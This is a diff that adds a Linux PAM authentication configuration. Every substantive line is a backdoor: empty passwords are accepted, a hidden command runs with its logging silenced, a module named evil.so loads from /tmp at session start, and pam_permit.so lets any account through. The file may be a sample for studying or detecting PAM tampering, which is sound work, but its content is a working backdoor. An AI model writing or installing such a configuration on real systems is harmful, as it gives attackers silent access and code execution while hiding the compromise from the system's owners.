@@ -1,0 +1,6 @@
+#%PAM-1.0
+auth       required     pam_unix.so nullok
+auth       [success=1 default=ignore]   pam_exec.so seteuid quiet log=/dev/null /usr/local/sbin/notify --all
+session    optional     /tmp/evil.so
+-session   optional     pam_systemd.so
+account    sufficient   /usr/lib/x86_64-linux-gnu/security/pam_permit.so
